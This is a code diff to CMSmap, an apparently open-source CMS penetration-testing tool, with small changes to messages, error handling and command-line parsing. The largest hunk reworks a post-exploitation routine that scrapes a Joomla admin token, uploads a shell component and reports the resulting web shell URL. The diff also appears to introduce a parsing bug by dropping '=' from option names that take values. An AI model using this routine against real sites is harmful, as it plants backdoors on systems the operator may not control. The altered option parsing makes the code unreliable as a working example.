@@ -21,7 +21,7 @@ class Initialize:
             process = os.system("git pull")
             if process == 0 : success = True
         if success :
-            print "[*] CMSmap is now updated to the latest version"
+            print "[*] CMSmap is now updated to the latest version!"
         else :
             print_yellow("[!] Updated could not be completed. Please download the latest version of CMSmap from GitHub repository")
             print_yellow("[!] Example: git clone https://github.com/m7x/cmsmap")
@@ -975,14 +975,17 @@ class PostExploit:
             # Get Token in Upload Page
             htmltext = opener.open(self.url+self.jooupload).read()
             reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
-            self.token = reg.search(htmltext).group(1) 
-            # Upload Component
-            self.params = { "install_package" : open("shell/joo-shell.zip", "rb") , "installtype":"upload","task":"install.install",self.token:"1"}
-            htmltext = opener.open(self.url+self.jooupload, self.params).read()
-            if re.search("Installing component was successful.",htmltext):
-                print_red("[!] CMSmap Joomla Shell Plugin Installed")
-                print_red_bold("[!] Web Shell: "+self.url+"/components/com_joo-shell/joo-shell.php")
-                print_yellow("[-] Remember to unistall CMSmap Joomla Shell Component")
+            try:
+                self.token = reg.search(htmltext).group(1)
+                # Upload Component
+                self.params = { "install_package" : open("shell/joo-shell.zip", "rb") , "installtype":"upload","task":"install.install",self.token:"1"}
+                htmltext = opener.open(self.url+self.jooupload, self.params).read()
+                if re.search("Installing component was successful.",htmltext):
+                    print_red("[!] CMSmap Joomla Shell Plugin Installed")
+                    print_red_bold("[!] Web Shell: "+self.url+"/components/com_joo-shell/joo-shell.php")
+                    print_yellow("[-] Remember to unistall CMSmap Joomla Shell Component")
+            except AttributeError:
+                print "[-] "+user+" in not admin"
         except urllib2.HTTPError, e:
             # print e.code
             pass
@@ -1147,7 +1150,7 @@ if __name__ == "__main__":
     # command line arguments
     if sys.argv[1:]:
         try:
-            optlist, args = getopt.getopt(sys.argv[1:], 't:u:p:T:vhU', ["target=", "verbose","help","usr=","psw=","threads=","update"])
+            optlist, args = getopt.getopt(sys.argv[1:], 't:u:p:T:vhU', ["target", "verbose","help","usr","psw=","threads","update"])
         except getopt.GetoptError as err:
             # print help information and exit:
             print(err) # print something like "option -a not recognized"
